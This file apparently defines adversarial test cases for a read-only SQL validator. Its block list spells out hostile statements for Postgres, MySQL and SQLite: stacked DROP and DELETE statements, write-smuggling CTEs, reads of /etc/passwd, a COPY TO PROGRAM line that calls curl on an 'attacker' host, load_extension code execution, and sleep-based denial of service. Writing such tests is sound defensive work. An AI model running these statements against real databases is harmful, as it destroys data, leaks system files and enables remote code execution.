/**
 * Adversarial safety cases (RT-F1) — the acceptance gate for the SQL validator.
 * Shared by the vitest suite (CI) and scripts/verify-safety-adversarial.ts (manual).
 * Every MUST_BLOCK statement is a real attack shape: writes/DDL, stacked
 * statements, data-modifying CTEs, read-only reversal, and per-dialect
 * side-effecting SELECT-legal functions. MUST_PASS measures the parser
 * false-positive rate on legitimate SELECTs.
 */
import type { Dialect } from '../connection-providers/provider-interface';

export type AdversarialCase = { sql: string; dialect: Dialect; expect: 'blocked' | 'ok'; label: string };

export const MUST_BLOCK: AdversarialCase[] = [
  // Writes / DDL (all dialects)
  { sql: "INSERT INTO users VALUES (1,'x')", dialect: 'postgres', expect: 'blocked', label: 'INSERT' },
  { sql: 'UPDATE users SET admin=true', dialect: 'mysql', expect: 'blocked', label: 'UPDATE' },
  { sql: 'DELETE FROM books', dialect: 'sqlite', expect: 'blocked', label: 'DELETE' },
  { sql: 'DROP TABLE users', dialect: 'postgres', expect: 'blocked', label: 'DROP' },
  { sql: 'TRUNCATE users', dialect: 'postgres', expect: 'blocked', label: 'TRUNCATE' },
  { sql: 'ALTER TABLE users ADD COLUMN x int', dialect: 'mysql', expect: 'blocked', label: 'ALTER' },
  // Stacked statements
  { sql: 'SELECT 1; DROP TABLE users', dialect: 'postgres', expect: 'blocked', label: 'stacked ;DROP' },
  { sql: 'SELECT 1; DELETE FROM books', dialect: 'sqlite', expect: 'blocked', label: 'stacked ;DELETE' },
  // Comment-tricked write
  { sql: 'SELECT 1 /* x */; DROP TABLE t', dialect: 'postgres', expect: 'blocked', label: 'comment + stacked' },
  // Data-modifying CTE — parses as top-level SELECT but writes on PG (code-review C1)
  { sql: "WITH x AS (INSERT INTO books (title) VALUES ('h') RETURNING *) SELECT * FROM x", dialect: 'postgres', expect: 'blocked', label: 'CTE INSERT bypass' },
  { sql: "WITH x AS (UPDATE books SET title='h' RETURNING id) SELECT * FROM x", dialect: 'postgres', expect: 'blocked', label: 'CTE UPDATE bypass' },
  { sql: 'WITH x AS (DELETE FROM books RETURNING id) SELECT * FROM x', dialect: 'postgres', expect: 'blocked', label: 'CTE DELETE bypass' },
  { sql: 'WITH x AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM x', dialect: 'mysql', expect: 'blocked', label: 'CTE INSERT (mysql)' },
  // Read-only transaction reversal (RT-F2)
  { sql: 'SET TRANSACTION READ WRITE', dialect: 'postgres', expect: 'blocked', label: 'SET TX READ WRITE' },
  { sql: 'SET default_transaction_read_only = off', dialect: 'postgres', expect: 'blocked', label: 'SET readonly off' },
  // PG side-effecting SELECT-legal functions (RT-F1)
  { sql: 'SELECT pg_terminate_backend(123)', dialect: 'postgres', expect: 'blocked', label: 'pg_terminate_backend' },
  { sql: 'SELECT pg_sleep(300)', dialect: 'postgres', expect: 'blocked', label: 'pg_sleep DoS' },
  { sql: "SELECT pg_read_file('/etc/passwd')", dialect: 'postgres', expect: 'blocked', label: 'pg_read_file exfil' },
  { sql: "SELECT lo_export(1, '/tmp/x')", dialect: 'postgres', expect: 'blocked', label: 'lo_export' },
  { sql: "COPY (SELECT * FROM users) TO PROGRAM 'curl attacker'", dialect: 'postgres', expect: 'blocked', label: 'COPY TO PROGRAM RCE' },
  { sql: "SELECT dblink_exec('...','DELETE FROM t')", dialect: 'postgres', expect: 'blocked', label: 'dblink_exec' },
  // MySQL exfil/DoS
  { sql: "SELECT * FROM users INTO OUTFILE '/tmp/dump'", dialect: 'mysql', expect: 'blocked', label: 'INTO OUTFILE' },
  { sql: "SELECT LOAD_FILE('/etc/passwd')", dialect: 'mysql', expect: 'blocked', label: 'LOAD_FILE' },
  { sql: 'SELECT SLEEP(300)', dialect: 'mysql', expect: 'blocked', label: 'MySQL SLEEP' },
  { sql: "SELECT BENCHMARK(100000000, MD5('x'))", dialect: 'mysql', expect: 'blocked', label: 'BENCHMARK DoS' },
  // SQLite RCE/exfil
  { sql: "SELECT load_extension('evil.so')", dialect: 'sqlite', expect: 'blocked', label: 'load_extension RCE' },
  { sql: "SELECT readfile('/etc/passwd')", dialect: 'sqlite', expect: 'blocked', label: 'readfile exfil' },
  { sql: "ATTACH DATABASE '/etc/passwd' AS x", dialect: 'sqlite', expect: 'blocked', label: 'ATTACH DATABASE' },
  { sql: 'PRAGMA writable_schema = ON', dialect: 'sqlite', expect: 'blocked', label: 'PRAGMA write' },
];

export const MUST_PASS: AdversarialCase[] = [
  { sql: 'SELECT COUNT(*) FROM books', dialect: 'sqlite', expect: 'ok', label: 'simple count' },
  { sql: 'SELECT title, price FROM books WHERE year > 2000 ORDER BY price DESC LIMIT 10', dialect: 'sqlite', expect: 'ok', label: 'select with limit' },
  { sql: 'SELECT b.title, c.name FROM books b JOIN book_categories bc ON b.id=bc.book_id JOIN categories c ON c.id=bc.category_id', dialect: 'sqlite', expect: 'ok', label: 'multi-join' },
  { sql: 'SELECT category_id, COUNT(*) FROM book_categories GROUP BY category_id HAVING COUNT(*) > 5', dialect: 'postgres', expect: 'ok', label: 'group by having' },
  { sql: 'WITH recent AS (SELECT * FROM books WHERE year > 2010) SELECT COUNT(*) FROM recent', dialect: 'postgres', expect: 'ok', label: 'CTE select' },
  { sql: 'WITH a AS (SELECT id FROM books), b AS (SELECT id FROM categories) SELECT COUNT(*) FROM a JOIN b USING(id)', dialect: 'postgres', expect: 'ok', label: 'multi-CTE select' },
  { sql: 'SELECT DISTINCT author FROM books', dialect: 'mysql', expect: 'ok', label: 'distinct' },
  { sql: "SELECT name FROM categories WHERE name LIKE '%Khoa%'", dialect: 'sqlite', expect: 'ok', label: 'vietnamese LIKE' },
];
